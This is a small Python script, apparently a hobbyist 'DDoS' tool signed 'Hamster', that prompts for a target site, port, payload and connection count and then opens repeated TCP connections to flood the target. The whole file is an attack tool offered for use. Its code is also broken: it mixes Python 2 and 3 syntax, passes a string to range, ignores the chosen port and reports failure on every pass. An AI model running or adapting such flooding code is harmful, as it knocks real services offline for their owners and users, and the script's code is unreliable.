import time
import socket
import os
import sys
import string
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
print ("Hamster")
print ("☠️")
print ("Instagram : @hamster.py")
print ("With great power comes great responsibility.")
print ("Thanks For Use")
host=input( "Site you want to DDoS:" )
port=input( "Port you want to attack:" )
message=input( "Input the message you want to send:" )
conn=input( "How many connections you want to make:" )
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[Ip is locked]" )
print ( "[Attacking " + host + "]" )
print ("+----------------------------+")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message )
    except socket.error, msg:
        print("|[Connection Failed]         |")
    print ( "|[DDoS Attack Failed]       |")
    ddos.close()
for i in range(1, conn):
    dos()
print ("+----------------------------+")
print("PKG HAS SEND")
if __name__ == "__main__":
    answer = raw_input("DDos More?")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")